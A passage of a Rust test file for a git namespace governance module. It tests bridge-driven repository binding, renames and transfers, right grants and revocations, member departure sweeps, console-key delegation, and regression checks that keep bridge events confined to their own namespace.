    assert_eq!(after.deleted, 2);
    let records = registry.trust_records().await;
    assert!(!records.contains_key(&projection::tuple_key(
        &f.carol.did,
        "git.commit.sign",
        &res
    )));
}

#[tokio::test]
async fn a_rename_withdraws_the_old_name_before_publishing_the_new() {
    let f = fixture().await;
    // A bridge-mode namespace, bound through the bridge.
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "bridge" }),
    )
    .await);
    let ns = body["namespace"]["id"].as_str().unwrap().to_string();
    let job = f.bridge.jobs.lock().unwrap()[0].1["jobId"].clone();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({ "namespace": ns, "event": { "type": "bindCompleted", "jobId": job, "ownerId": "1", "kind": "organization" } }),
    )
    .await);
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": "github.com/acme/widgets", "owners": [f.bob.did] }),
    )
    .await);
    // The inspection result gives the repository its forge id.
    let inspect = super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
        .await
        .unwrap()
        .into_iter()
        .find(|j| j.kind == super::bridge::JobKind::Inspect)
        .unwrap();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/result",
        json!({
            "jobId": inspect.job_id, "outcome": "succeeded",
            "repo": { "resource": "github.com/acme/widgets", "forgeId": "812736451" },
            "steps": [
                { "step": "workflow", "outcome": "unchanged" },
                { "step": "keyring", "outcome": "unchanged" },
                { "step": "variables", "outcome": "unchanged" },
                { "step": "requiredCheck", "outcome": "unchanged" }
            ],
        }),
    )
    .await);

    let registry = MockRegistryClient::new();
    let mut backoff = Backoff::default();
    projection::reconcile(&f.vtc.state, &registry, TEST_VTC_DID, &mut backoff)
        .await
        .unwrap();
    let old = projection::tuple_key(&f.bob.did, "git.commit.sign", "github.com/acme/widgets");
    assert!(registry.trust_records().await.contains_key(&old));

    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({ "namespace": ns, "event": { "type": "repoRenamed", "forgeId": "812736451", "from": "github.com/acme/widgets", "to": "github.com/acme/widgets-core" } }),
    )
    .await);

    // The old name's withdrawal fails: nothing is published for the new name.
    registry
        .fail_next_trust_record(crate::registry::RegistryError::Transient("down".into()))
        .await;
    let held = projection::reconcile(&f.vtc.state, &registry, TEST_VTC_DID, &mut backoff)
        .await
        .unwrap();
    assert!(held.held_back > 0);
    let new = projection::tuple_key(
        &f.bob.did,
        "git.commit.sign",
        "github.com/acme/widgets-core",
    );
    assert!(!registry.trust_records().await.contains_key(&new));

    // Once withdrawn, the new name is published; the old stays gone.
    let mut backoff = Backoff::default();
    projection::reconcile(&f.vtc.state, &registry, TEST_VTC_DID, &mut backoff)
        .await
        .unwrap();
    let records = registry.trust_records().await;
    assert!(records.contains_key(&new));
    assert!(!records.contains_key(&old));
}

// ── bridge results ──────────────────────────────────────────────────────────

#[tokio::test]
async fn a_result_for_a_job_never_sent_is_unknown_and_only_the_bridge_reports() {
    let f = fixture().await;
    let out = send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/result",
        json!({ "jobId": "job_nope", "outcome": "succeeded" }),
    )
    .await;
    assert_eq!(code(&out), "git-ns/bridge/result:unknownJob");
}

#[tokio::test]
async fn create_in_a_bridge_organisation_activates_on_the_result() {
    let f = fixture().await;
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "bridge" }),
    )
    .await);
    let ns = body["namespace"]["id"].as_str().unwrap().to_string();
    let job = f.bridge.jobs.lock().unwrap()[0].1["jobId"].clone();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({ "namespace": ns, "event": { "type": "bindCompleted", "jobId": job, "ownerId": "1", "kind": "organization" } }),
    )
    .await);
    let out = ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public", "owners": [f.bob.did] }),
    )
    .await);
    assert_eq!(out["repo"]["state"], "pendingCreate");
    assert!(out.get("manualSteps").is_none() || out["manualSteps"] == json!([]));

    // The queued job is sent by the projector's dispatch.
    super::bridge::dispatch_due(&f.vtc.state).await.unwrap();
    let create = super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
        .await
        .unwrap()
        .into_iter()
        .find(|j| j.kind == super::bridge::JobKind::CreateRepo)
        .unwrap();
    assert_eq!(create.state, super::bridge::JobState::Accepted);

    // A stranger cannot report on it.
    let forged = send(
        &f.vtc.state,
        &f.stranger,
        "bridge/result",
        json!({ "jobId": create.job_id, "outcome": "succeeded" }),
    )
    .await;
    assert_eq!(code(&forged), "permissionDenied");

    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/result",
        json!({
            "jobId": create.job_id, "outcome": "succeeded",
            "repo": { "resource": "github.com/acme/gadgets", "forgeId": "812736990" },
            "steps": [
                { "step": "create", "outcome": "applied" },
                { "step": "workflow", "outcome": "applied" },
                { "step": "keyring", "outcome": "applied" },
                { "step": "variables", "outcome": "applied" },
                { "step": "requiredCheck", "outcome": "applied" }
            ],
        }),
    )
    .await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let repo = snap.repo_at("github.com/acme/gadgets").unwrap();
    assert_eq!(repo.state, RepoState::Active);
    assert_eq!(repo.forge_id.as_deref(), Some("812736990"));
    assert!(repo.bootstrap.required_check);
}

// ── lifecycle ───────────────────────────────────────────────────────────────

#[tokio::test]
async fn a_departed_members_rights_go_and_their_sole_repository_is_orphaned() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    ok(&grant(&f, &f.bob, &f.carol.did, "git.commit.sign", &res).await);
    // Bob leaves: his ACL row goes, as removal does.
    crate::acl::delete_acl_entry(&f.vtc.state.acl_ks, &f.bob.did)
        .await
        .unwrap();
    assert!(super::lifecycle::sweep(&f.vtc.state).await.unwrap());
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let repo = snap.repo_at(&res).unwrap();
    assert_eq!(repo.state, RepoState::Orphaned);
    let rows = snap.rows(&Scope::Repo(repo.id.clone()));
    assert!(rows.iter().all(|r| r.subject != f.bob.did));
    // The grant Bob issued stays, listed for review.
    assert!(rows.iter().any(|r| r.subject == f.carol.did));
    let departed = super::lifecycle::issued_by_departed(&f.vtc.state)
        .await
        .unwrap();
    assert_eq!(departed.get(&f.bob.did).map(Vec::len), Some(1));

    // A namespace admin names a new owner; the repository is active again.
    ok(&grant(&f, &f.admin, &f.carol.did, "git.repo.own", &res).await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert_eq!(snap.repo_at(&res).unwrap().state, RepoState::Active);
}

#[tokio::test]
async fn a_lapsed_right_is_withdrawn_and_recorded() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    // Write an already-lapsed row directly: the grant task refuses one.
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let scope = Scope::Repo(snap.repo_at(&res).unwrap().id.clone());
    let mut set = store::get_rights(&f.vtc.state.git_ns.ks, &scope)
        .await
        .unwrap();
    let mut row = set.rows[0].clone();
    row.subject = f.carol.did.clone();
    row.right = super::model::Right::CommitSign;
    row.expires_at = Some("2020-01-01T00:00:00Z".parse().unwrap());
    set.rows.push(row);
    store::put_rights(&f.vtc.state.git_ns.ks, &scope, &set)
        .await
        .unwrap();
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(
        !projection::desired(&snap, super::ops::now()).contains_key(&projection::tuple_key(
            &f.carol.did,
            "git.commit.sign",
            &res
        )),
        "a lapsed right is never published, sweep or no sweep"
    );
    assert!(super::lifecycle::sweep_expiry(&f.vtc.state).await.unwrap());
    let set = store::get_rights(&f.vtc.state.git_ns.ks, &scope)
        .await
        .unwrap();
    assert!(set.rows.iter().all(|r| r.subject != f.carol.did));
}

// ── account links ───────────────────────────────────────────────────────────

#[tokio::test]
async fn account_link_needs_a_bridge_namespace_and_status_answers_only_its_owner() {
    let f = fixture().await;
    let out = send(
        &f.vtc.state,
        &f.bob,
        "account/link",
        json!({ "forge": "github.com" }),
    )
    .await;
    assert_eq!(code(&out), "git-ns/account/link:unsupportedForge");

    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "bridge" }),
    )
    .await);
    let ns = body["namespace"]["id"].as_str().unwrap().to_string();
    let job = f.bridge.jobs.lock().unwrap()[0].1["jobId"].clone();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({ "namespace": ns, "event": { "type": "bindCompleted", "jobId": job, "ownerId": "1", "kind": "organization" } }),
    )
    .await);

    let link = ok(&send(
        &f.vtc.state,
        &f.bob,
        "account/link",
        json!({ "forge": "github.com" }),
    )
    .await);
    let link_id = link["linkId"].as_str().unwrap().to_string();
    let status = ok(&send(
        &f.vtc.state,
        &f.bob,
        "account/link-status",
        json!({ "linkId": link_id }),
    )
    .await);
    assert_eq!(status["state"], "pending");
    let other = send(
        &f.vtc.state,
        &f.carol,
        "account/link-status",
        json!({ "linkId": link_id }),
    )
    .await;
    assert_eq!(code(&other), "git-ns/account/link-status:unknownLink");

    // The bridge reports the link; the account is recorded on Bob.
    let link_job = f.bridge.jobs.lock().unwrap()[1].1["jobId"].clone();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({ "namespace": ns, "event": { "type": "accountLinked", "jobId": link_job, "account": { "forge": "github.com", "id": "9120045", "login": "bob-builds" } } }),
    )
    .await);
    let status = ok(&send(
        &f.vtc.state,
        &f.bob,
        "account/link-status",
        json!({ "linkId": link_id }),
    )
    .await);
    assert_eq!(status["state"], "linked");
    assert_eq!(status["account"]["id"], "9120045");
    let accounts = super::bridge::linked_accounts(&f.vtc.state).await.unwrap();
    assert_eq!(accounts[&f.bob.did]["github.com"].login, "bob-builds");
}

// ── the dispatcher ──────────────────────────────────────────────────────────

#[test]
fn every_git_ns_task_is_served() {
    let served = super::tasks::served_uris();
    for task in [
        "namespace/bind",
        "namespace/unbind",
        "repo/create",
        "repo/adopt",
        "repo/transfer",
        "repo/archive",
        "right/grant",
        "right/revoke",
        "view",
        "account/link",
        "account/link-status",
        "bridge/result",
        "bridge/event",
        "drift/resolve",
        "roles/reproject",
    ] {
        assert!(served.contains(&uri(task).as_str()), "{task} is not served");
    }
    assert!(served.contains(&RESEAT_URI), "reseat 0.3 is not served");
    assert!(
        !served.contains(&uri("namespace/reseat").as_str()),
        "reseat 0.1 is still served"
    );
    for task in ["view", "bridge/event"] {
        assert!(
            served.contains(&format!("{URI}/{task}/0.2").as_str()),
            "{task} 0.2 is not served"
        );
    }
    assert!(served.contains(&format!("{URI}/bridge/event/0.3").as_str()));
    assert!(served.contains(&uri("roles/reproject").as_str()));
    // `bridge/job` is the VTC's to send, never to serve.
    assert!(!served.contains(&uri("bridge/job").as_str()));
    // Grant and revoke are served at 0.3 only: an older version would skip
    // fixed rule 7 and the `breakGlass` flag on the records it answers.
    for task in ["right/grant", "right/revoke"] {
        for old in ["0.1", "0.2"] {
            assert!(
                !served.contains(&format!("{URI}/{task}/{old}").as_str()),
                "{task} {old} is still served"
            );
        }
    }
}

#[tokio::test]
async fn a_proof_required_git_ns_task_is_refused_unsigned() {
    let f = fixture().await;
    let doc: TrustTask<Value> = vta_sdk::trust_task_sign::build_unsigned(
        &uri("right/grant"),
        json!({ "subject": f.bob.did, "right": "git.commit.sign", "resource": "github.com/acme" }),
        &f.admin.did,
        TEST_VTC_DID,
    )
    .unwrap();
    let out = dispatch_trust_task_core(
        &f.vtc.state,
        &JoinAuthCtx::rest(),
        &serde_json::to_vec(&doc).unwrap(),
    )
    .await;
    assert_eq!(code(&out), "proofRequired");
}

// ── the bridge's service grant ──────────────────────────────────────────────

#[tokio::test]
async fn a_bound_bridge_namespace_grants_its_bridge_commit_sign_and_nothing_else() {
    let f = fixture().await;
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "bridge" }),
    )
    .await);
    let ns = body["namespace"]["id"].as_str().unwrap().to_string();
    let job = f.bridge.jobs.lock().unwrap()[0].1["jobId"].clone();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({ "namespace": ns, "event": { "type": "bindCompleted", "jobId": job, "ownerId": "1", "kind": "organization" } }),
    )
    .await);

    // Recorded as a service grant: the community itself is the granter, and
    // the bridge — not a member — holds `git.commit.sign` on the namespace.
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let rows = snap.rows(&Scope::Namespace(ns.clone()));
    let grant_row = rows
        .iter()
        .find(|r| r.subject == f.bridge_party.did)
        .expect("the bridge holds a service grant");
    assert_eq!(grant_row.right, super::model::Right::CommitSign);
    assert_eq!(grant_row.granted_by, TEST_VTC_DID);
    assert!(!grant_row.subject_was_member);

    // Published like any other commit right.
    let registry = MockRegistryClient::new();
    projection::reconcile(
        &f.vtc.state,
        &registry,
        TEST_VTC_DID,
        &mut Backoff::default(),
    )
    .await
    .unwrap();
    let key = projection::tuple_key(&f.bridge_party.did, "git.commit.sign", "github.com/acme");
    let record = registry
        .trust_records()
        .await
        .get(&key)
        .cloned()
        .expect("published");
    // Who granted it stays inside the VTC, even when it is the VTC.
    assert!(record["context"].get("grantedBy").is_none());

    // The default policy's exception is exact: a grant to any other
    // non-member — even one naming the bridge's right — is still refused.
    let out = grant(
        &f,
        &f.admin,
        &f.stranger.did,
        "git.commit.sign",
        "github.com/acme",
    )
    .await;
    assert_eq!(code(&out), "git-ns:policyDenied");

    // A departure sweep does not touch it: the bridge never was a member.
    super::lifecycle::sweep(&f.vtc.state).await.unwrap();
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(
        snap.rows(&Scope::Namespace(ns.clone()))
            .iter()
            .any(|r| r.subject == f.bridge_party.did)
    );

    // Unbinding ends it with everything else.
    let out = ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/unbind",
        json!({ "namespace": ns }),
    )
    .await);
    assert_eq!(
        out["rightsRevoked"], 2,
        "the admin's ns.admin and the bridge's grant"
    );
}

// ── console-key delegation (#1684, #1692) ───────────────────────────────────

#[tokio::test]
async fn a_console_key_acts_as_its_admin_and_a_revoked_one_as_nobody() {
    let f = fixture().await;
    let console = Party::new();
    crate::acl::console_key::enrol_delegation(
        &f.vtc.state.console_keys_ks,
        &f.vtc.state.acl_ks,
        &console.did,
        &f.admin.did,
        Some("browser".into()),
        None,
    )
    .await
    .unwrap();
    // The console key binds as the admin: the binder, and the first
    // `git.ns.admin`, is the admin DID, not the key.
    let body = ok(&send(
        &f.vtc.state,
        &console,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "manual" }),
    )
    .await);
    let ns = body["namespace"]["id"].as_str().unwrap().to_string();
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert_eq!(
        super::rules::admins(&snap, &ns, super::ops::now()),
        vec![f.admin.did.clone()]
    );
    // …and grants with the admin's git rights.
    ok(&grant(
        &f,
        &console,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await);

    crate::acl::console_key::revoke_delegation(
        &f.vtc.state.console_keys_ks,
        &console.did,
        &f.admin.did,
    )
    .await
    .unwrap();
    let out = grant(
        &f,
        &console,
        &f.carol.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
}

// ── the bridge's ext report ─────────────────────────────────────────────────

#[tokio::test]
async fn the_bridges_ext_report_reaches_the_admin_rows() {
    let f = fixture().await;
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "bridge" }),
    )
    .await);
    let ns = body["namespace"]["id"].as_str().unwrap().to_string();
    let job = f.bridge.jobs.lock().unwrap()[0].1["jobId"].clone();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({
            "namespace": ns,
            "event": { "type": "bindCompleted", "jobId": job, "ownerId": "1", "kind": "organization" },
            "ext": { "org.openvtc.git-ns": { "namespace": {
                "installationId": "55120033", "appSlug": "acme-vgi",
                "missingPermissions": ["organization_administration"],
                "orgRulesets": true
            } } },
        }),
    )
    .await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let status = snap.namespace(&ns).unwrap().forge_status.clone().unwrap();
    assert_eq!(status.installation_id.as_deref(), Some("55120033"));
    assert_eq!(
        status.missing_permissions,
        vec!["organization_administration"]
    );
    assert_eq!(status.org_rulesets, Some(true));

    // A repository's guard and step outcomes, from an inspect result.
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": "github.com/acme/widgets", "owners": [f.bob.did] }),
    )
    .await);
    let inspect = super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
        .await
        .unwrap()
        .into_iter()
        .find(|j| j.kind == super::bridge::JobKind::Inspect)
        .unwrap();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/result",
        json!({
            "jobId": inspect.job_id, "outcome": "partial",
            "repo": { "resource": "github.com/acme/widgets", "forgeId": "7" },
            "steps": [{ "step": "requiredCheck", "outcome": "failed", "detail": "not required" }],
            "ext": { "org.openvtc.git-ns": { "repo": { "guard": "codeOwnerReview" } } },
        }),
    )
    .await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let repo = snap.repo_at("github.com/acme/widgets").unwrap();
    assert_eq!(repo.forge_report.guard.as_deref(), Some("codeOwnerReview"));
    assert_eq!(repo.forge_report.steps.len(), 1);
}

// ── the admin and activity reads ────────────────────────────────────────────

/// A REST read under a session. `contexts` empty is a community-wide admin;
/// a named context is an admin session scoped narrower than the community —
/// the only other kind a VTC authenticates (it admits the admin role alone).
async fn get(f: &Fixture, did: &str, contexts: Vec<String>, path: &str) -> (u16, Value) {
    use tower::ServiceExt;
    let token = f.vtc.token(did, "admin", contexts).await;
    let mut req = axum::http::Request::builder()
        .uri(format!("/v1{path}"))
        .header("authorization", format!("Bearer {token}"));
    if path.starts_with("/git-ns/view") {
        req = req.header("trust-task", uri("view"));
    }
    let req = req.body(axum::body::Body::empty()).unwrap();
    let resp = f.vtc.router.clone().oneshot(req).await.unwrap();
    let status = resp.status().as_u16();
    let bytes = axum::body::to_bytes(resp.into_body(), 1 << 20)
        .await
        .unwrap();
    (
        status,
        serde_json::from_slice(&bytes).unwrap_or(Value::Null),
    )
}

#[tokio::test]
async fn a_namespace_admin_reads_their_activity_and_nobody_elses() {
    let f = fixture().await;
    let ns = bind_manual(&f).await;
    ok(&grant(&f, &f.admin, &f.bob.did, "git.ns.admin", "github.com/acme").await);

    // Bob administers the namespace; he is not a community administrator.
    let (status, body) = get(&f, &f.bob.did, vec!["ops".into()], "/git-ns/activity").await;
    assert_eq!(status, 200, "{body}");
    let items = body["items"].as_array().unwrap();
    assert!(items.iter().any(|i| i["action"] == "gitNs.right.granted"
        && i["subject"] == json!(f.bob.did)
        && i["namespace"] == json!(ns)));

    // Carol administers nothing.
    let (status, _) = get(&f, &f.carol.did, vec!["ops".into()], "/git-ns/activity").await;
    assert_eq!(status, 403);

    // The community administrator reads the linked accounts.
    let (status, body) = get(&f, &f.admin.did, vec![], "/git-ns/accounts").await;
    assert_eq!(status, 200, "{body}");
    assert!(body["accounts"].as_array().unwrap().is_empty());
}

// ── review of #1694: regression tests, one or more per finding ──────────────

/// Bind `github.com/acme` through the bridge; returns its id.
async fn bind_bridge(f: &Fixture) -> String {
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "bridge" }),
    )
    .await);
    let ns = body["namespace"]["id"].as_str().unwrap().to_string();
    let job = f
        .bridge
        .jobs
        .lock()
        .unwrap()
        .iter()
        .rev()
        .find(|(_, p)| p["kind"] == "beginBind")
        .unwrap()
        .1["jobId"]
        .clone();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({ "namespace": ns, "event": { "type": "bindCompleted", "jobId": job, "ownerId": "1", "kind": "organization" } }),
    )
    .await);
    ns
}

/// Adopt `resource` for Bob in a bridge namespace, and give it `forge_id`
/// through the inspection result, as a bridge does.
async fn adopt_with_forge_id(f: &Fixture, resource: &str, forge_id: &str) {
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": resource, "owners": [f.bob.did] }),
    )
    .await);
    let inspect = super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
        .await
        .unwrap()
        .into_iter()
        .find(|j| j.kind == super::bridge::JobKind::Inspect && j.payload["repo"] == resource)
        .unwrap();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/result",
        json!({
            "jobId": inspect.job_id, "outcome": "succeeded",
            "repo": { "resource": resource, "forgeId": forge_id },
            "steps": [{ "step": "requiredCheck", "outcome": "unchanged" }],
        }),
    )
    .await);
}

async fn event(f: &Fixture, ns: &str, event: Value) -> TrustTaskOutcome {
    send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({ "namespace": ns, "event": event }),
    )
    .await
}

async fn reconcile(f: &Fixture, registry: &MockRegistryClient) -> projection::PassReport {
    projection::reconcile(
        &f.vtc.state,
        registry,
        TEST_VTC_DID,
        &mut Backoff::default(),
    )
    .await
    .unwrap()
}

async fn desired_now(f: &Fixture) -> std::collections::BTreeMap<String, projection::Tuple> {
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    projection::desired_all(&f.vtc.state, &snap, super::ops::now())
        .await
        .unwrap()
}

// Finding 1 — bridge event scope.

/// The reviewer's reproduction: A is renamed away (webhook lost), B is created
/// at A's old name (webhook lost), then B is renamed. B's rename names A's old
/// resource as `from`; matched by name it would carry A's grants onto B.
#[tokio::test]
async fn finding_1_a_rename_of_a_repository_reusing_a_lost_name_does_not_move_its_grants() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    adopt_with_forge_id(&f, "github.com/acme/widgets", "100").await;
    ok(&grant(
        &f,
        &f.bob,
        &f.carol.did,
        "git.commit.sign",
        "github.com/acme/widgets",
    )
    .await);
    // Lost: A renamed widgets → widgets-old; lost: B created at widgets as 200.
    ok(&event(
        &f,
        &ns,
        json!({ "type": "repoRenamed", "forgeId": "200", "from": "github.com/acme/widgets", "to": "github.com/acme/gadgets" }),
    )
    .await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let a = snap.repo_at("github.com/acme/widgets").unwrap();
    assert_eq!(a.forge_id.as_deref(), Some("100"), "A was not taken for B");
    assert!(snap.repo_at("github.com/acme/gadgets").is_none());
    let want = desired_now(&f).await;
    assert!(
        want.values()
            .all(|t| t.resource != "github.com/acme/gadgets"),
        "no right of A's is published on B's new name"
    );
}

/// The same sequence when B's `repoCreatedUnmanaged` does arrive: the name's
/// new holder displaces A, whose rights are withdrawn, and B's later rename
/// carries nothing.
#[tokio::test]
async fn finding_1_a_repository_created_at_a_governed_name_detaches_the_old_one() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    adopt_with_forge_id(&f, "github.com/acme/widgets", "100").await;
    ok(&event(
        &f,
        &ns,
        json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": "github.com/acme/widgets" }),
    )
    .await);
    ok(&event(
        &f,
        &ns,
        json!({ "type": "repoRenamed", "forgeId": "200", "from": "github.com/acme/widgets", "to": "github.com/acme/gadgets" }),
    )
    .await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(
        snap.repos
            .iter()
            .all(|r| r.forge_id.as_deref() != Some("100")),
        "the displaced repository is detached and folded away"
    );
    let b = snap.repo_at("github.com/acme/gadgets").unwrap();
    assert_eq!(b.state, RepoState::Unmanaged);
    assert!(snap.rows(&Scope::Repo(b.id.clone())).is_empty());
    let want = desired_now(&f).await;
    assert!(want.values().all(|t| !t.resource.starts_with("github.com/acme/")
        || t.resource == "github.com/acme"));
}

/// Every resource an event names must be a repository of the event's own
/// namespace; a repository leaving it is detached, never moved.
#[tokio::test]
async fn finding_1_events_are_confined_to_their_namespace_and_a_transfer_out_detaches() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    adopt_with_forge_id(&f, "github.com/acme/widgets", "100").await;
    let widgets_id = Snapshot::load(&f.vtc.state.git_ns.ks)
        .await
        .unwrap()
        .repo_at("github.com/acme/widgets")
        .unwrap()
        .id
        .clone();
    // A second namespace of this VTC, governed separately.
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "beta", "mode": "manual" }),
    )
    .await);
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": "github.com/beta/tools", "owners": [f.carol.did] }),
    )
    .await);

    for bad in [
        json!({ "type": "repoDeleted", "forgeId": "9", "resource": "github.com/beta/tools" }),
        json!({ "type": "repoCreatedUnmanaged", "forgeId": "9", "resource": "codeberg.org/acme/x" }),
        json!({ "type": "repoRenamed", "forgeId": "100", "from": "github.com/acme/widgets", "to": "github.com/beta/widgets" }),
        json!({ "type": "repoTransferred", "forgeId": "9", "from": "github.com/beta/tools", "to": "github.com/acme/tools" }),
    ] {
        let out = event(&f, &ns, bad.clone()).await;
        assert_eq!(code(&out), "permissionDenied", "{bad}");
    }
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert_eq!(
        snap.repo_at("github.com/beta/tools").unwrap().state,
        RepoState::Active
    );
    assert_eq!(
        snap.repo_at("github.com/acme/widgets").unwrap().state,
        RepoState::Active
    );

    // Transferred into another bound namespace: detached, rights withdrawn,
    // nothing carried into `beta`.
    ok(&event(
        &f,
        &ns,
        json!({ "type": "repoTransferred", "forgeId": "100", "from": "github.com/acme/widgets", "to": "github.com/beta/widgets" }),
    )
    .await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let a = snap.repo(&widgets_id).unwrap();
    assert_eq!(a.state, RepoState::Detached);
    assert_eq!(a.resource, "github.com/acme/widgets");
    assert_eq!(
        a.forge_id, None,
        "a detached row is not addressable by forge id"
    );
    assert!(snap.rows(&Scope::Repo(a.id.clone())).is_empty());
    assert!(snap.repo_at("github.com/beta/widgets").is_none());
}

// Finding 2 — nothing of who granted or why is published.

#[tokio::test]
async fn finding_2_no_published_record_names_its_granter_or_a_reason() {
    let f = fixture().await;
    bind_bridge(&f).await;
    adopt_with_forge_id(&f, "github.com/acme/widgets", "100").await;
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "right/grant",
        json!({ "subject": f.carol.did, "right": "git.repo.maintain", "resource": "github.com/acme/widgets", "reason": "secret" }),
    )
    .await);
    let registry = MockRegistryClient::new();
    reconcile(&f, &registry).await;
    let records = registry.trust_records().await;
    assert!(records.len() >= 6, "admin, bridge, bob, carol");
    for record in records.values() {
        let context = record["context"].as_object().unwrap();
        assert!(!context.contains_key("grantedBy"), "{record}");
        assert!(!context.contains_key("reason"), "{record}");
        assert!(!record.to_string().contains("secret"));
        for key in context.keys() {
            assert!(
                ["framework", "activeFrom", "activeTo", "impliedBy", "origin"]
                    .contains(&key.as_str()),
                "unexpected context member {key}"
            );
        }
    }
}

// Finding 3 — one writer per registry key.

async fn map_members_to(f: &Fixture, resource: &str) {
    f.vtc.state.config.write().await.hooks.git_trust = Some(crate::hooks::GitTrustHooksConfig {
        grant_on_role: std::collections::BTreeMap::from([(
            "member".to_string(),
            resource.to_string(),
        )]),
        revoke_with_membership: true,
    });
}

/// A v0.1 role-derived grant inside a bound namespace is a second source of
/// the projection's own; revoking an explicit grant of the same key does not
/// withdraw what the role still wants.
#[tokio::test]
async fn finding_3_a_role_derived_grant_is_a_source_and_survives_a_revoke_of_the_same_key() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    map_members_to(&f, &res).await;
    let registry = MockRegistryClient::new();
    reconcile(&f, &registry).await;
    let key = projection::tuple_key(&f.carol.did, "git.commit.sign", &res);
    let record = registry.trust_records().await.get(&key).cloned().unwrap();
    assert_eq!(record["context"]["origin"], "roleDerived");

    // An explicit grant of the same key, then its revoke.
    ok(&grant(&f, &f.bob, &f.carol.did, "git.commit.sign", &res).await);
    reconcile(&f, &registry).await;
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "right/revoke",
        json!({ "subject": f.carol.did, "right": "git.commit.sign", "resource": res }),
    )
    .await);
    reconcile(&f, &registry).await;
    let record = registry
        .trust_records()
        .await
        .get(&key)
        .cloned()
        .expect("the role still wants it: not withdrawn");
    assert_eq!(record["context"]["origin"], "roleDerived");

    // The member leaves: now no source wants it.
    crate::acl::delete_acl_entry(&f.vtc.state.acl_ks, &f.carol.did)
        .await
        .unwrap();
    reconcile(&f, &registry).await;
    assert!(!registry.trust_records().await.contains_key(&key));
}

/// The verify pass: a record the registry lost is put again, one it holds that
/// nothing wants is deleted — also after the mirror was lost (a restore).
#[tokio::test]
async fn finding_3_verify_repairs_the_registry_and_rebuilds_a_lost_mirror() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    let registry = MockRegistryClient::new();
    reconcile(&f, &registry).await;
    let wanted = projection::tuple_key(&f.bob.did, "git.commit.sign", &res);
    let stray = |did: &str| {
        json!({
            "entity_id": did, "authority_id": TEST_VTC_DID,
            "action": "git.commit.sign", "resource": res,
            "record_type": "authorization", "authorized": true, "context": {},
        })
    };

